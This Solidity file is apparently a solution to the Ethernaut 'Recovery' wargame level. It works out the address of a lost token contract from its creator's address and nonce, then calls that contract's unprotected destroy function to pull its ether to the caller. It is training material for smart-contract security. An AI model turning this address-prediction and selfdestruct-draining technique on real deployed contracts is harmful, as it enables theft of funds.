// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IRecovery.sol";

/**
 * @title Recovery Attack (Ethernaut Challenge Level 17 - Recovery)
 * @author Emre Tepe (@emretepedev)
 * @notice Attack contract for level 17
 * @custom:ethernaut https://ethernaut.openzeppelin.com/level/0x0EB8e4771ABA41B70d0cb6770e04086E5aee5aB2
 * @custom:security-contact emretepedev@gmail.com
 */
contract RecoveryAttack {
    /*//////////////////////////////////////////////////////////////
                                Attack
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Attack and solve the level
     * @param target Address of target contract
     */
    function attack(IRecovery target) external {
        address lostContractAddress = address(
            uint160(uint256(keccak256(abi.encodePacked(uint8(214), uint8(148), target, uint8(1)))))
        );

        require(0 < lostContractAddress.balance, "Recovery: Wrong balance");

        // solhint-disable-next-line avoid-low-level-calls
        (bool isSuccess, ) = lostContractAddress.call(abi.encodeWithSignature("destroy(address)", msg.sender));

        require(isSuccess && 0 == lostContractAddress.balance, "Recovery: Attack failed");
    }
}
